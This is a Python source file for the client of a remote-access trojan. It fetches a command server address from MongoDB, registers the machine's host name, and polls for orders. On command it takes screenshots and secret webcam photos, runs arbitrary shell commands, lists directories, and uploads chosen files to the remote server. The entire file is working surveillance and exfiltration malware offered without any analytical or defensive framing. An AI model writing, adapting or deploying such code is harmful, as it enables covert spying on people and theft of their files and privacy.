import requests
import numpy
import os
import time
import subprocess as sp
import json
import cv2
import pyautogui
import tempfile
import pymongo
import socket

# initiates mongodb
client = pymongo.MongoClient("mongodb+srv://{username}:{password}@cluster0.qajos.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
conn = client.main 
col = conn.server

# gets url from mongodb
array = list(col.find({'p63': 'p63'}))

def webcam_ss(data):
  # for screenshot
  if str(data) == '1':
    img_name = 'img'
    image = pyautogui.screenshot()
    image = cv2.cvtColor(numpy.array(image),cv2.COLOR_RGB2BGR)
  
  # for taking a webcam picture
  if str(data) == '2':
    img_name = 'webcam'
    camera = cv2.VideoCapture(0)
    return_value,image = camera.read()
  
  # sends the data
  try:
    final = numpy.asarray(image)
    path = str(tempfile.gettempdir())
    cv2.imwrite(os.path.join(path, img_name + ".png"), final)

    # print('sending')
    # preapres data to be sent
    files = {'file': open(str(path + '\\' + img_name + '.png'), 'rb')}
    response = requests.post(str(array[0]['server']) + '/webcam-ss', files=files)

    if str(data) == '2':
      camera.release()

    def trying():
      if str(response) == '<Response [200]>':
        # print(response.content.decode("utf-8"))
        pass
      else:
        trying()
    trying()
  except:
    # print('err')
    pass

# browse files
def browse_files(data):
  output = sp.getoutput(str(data))

  # creates a array with all the file names
  def output_main():
    arr = []
    i = 0
    dir = str(os.getcwd())
    while i != len(os.listdir(dir)):
      if os.listdir(dir)[i] not in arr:
        arr.append(os.listdir(dir)[i])
      i += 1
      
    output = {'files': str(arr), 'dir': str(os.getcwd())}
    return output

  # does:- cd..
  if str(data) == 'cd..':
    os.chdir("..")
    output = output_main()

  # changes the dir to desired folder (example:- cd Music, cd Documents, etc.)
  if str(data)[0:2] == 'cd':
    os.chdir(str(data)[3:int(len(data))])
    output = output_main()

  # returns list of all files and folders
  if str(data) == 'dir':
    output = output_main()

  # print('sending')
  dataInput = {'data': output}
  response = requests.post(str(array[0]['server']) + '/browse-files', json=dataInput)
  # print(str(response))
  def trying():
    if str(response) == '<Response [200]>':
      # print(response.content.decode("utf-8"))
      pass
    else:
      trying()
  trying()

# sends file from client to server
def save_file(dir):
  files = {'file': open(dir, 'rb')}
  r = requests.post(str(array[0]['server']) + '/save-file', files=files)
  # print(r)

# used to check if there are any commands to be executed for the device
def check():
  dataInput = {'id': str(socket.gethostname())}
  response = requests.post(str(array[0]['server']) + '/add', json=dataInput)
  # print(response.content.decode("utf-8").replace('\n',''))
  while True:
    time.sleep(1)
    try:
      response = requests.get(str(array[0]['server']) + '/check')
      responseData = json.loads(response.content.decode("utf-8"))

      # checks if the current pc has any commands to be executed
      if responseData['deviceName'] == str(socket.gethostname()):

        # if yes then it executes the corresponding command
        if str(responseData['command']) == '1':
          webcam_ss(1)
          
        if str(responseData['command']) == '2':
          webcam_ss(2)

        if str(responseData['command']) == '3':
          browse_files(str(responseData['data']))

        if str(responseData['command']) == '4':
          save_file(str(responseData['data']))

    except Exception as e:
      check()

check()
